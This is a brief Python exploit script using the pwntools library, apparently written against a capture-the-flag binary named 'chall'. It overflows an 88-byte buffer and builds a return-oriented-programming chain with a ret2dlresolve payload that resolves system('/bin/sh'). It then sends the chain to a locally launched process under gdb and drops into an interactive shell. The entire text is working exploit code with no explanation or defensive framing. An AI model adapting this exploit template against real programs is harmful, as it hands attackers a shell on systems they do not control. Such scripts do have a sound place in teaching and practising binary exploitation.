from pwn import *

context.binary = exe = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process()
gdb.attach(io, api=True)

rop = ROP(exe)

dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
rop.raw(b"A"*88)
rop.raw(rop.find_gadget(["ret"]))
rop.raw(rop.find_gadget(["pop rdi","ret"]))
rop.raw(dlresolve.data_addr)
rop.raw(0x0000000000401050)
rop.ret2dlresolve(dlresolve)

print(rop.dump())

io.sendline(rop.chain())
io.sendline(dlresolve.payload)

io.interactive()
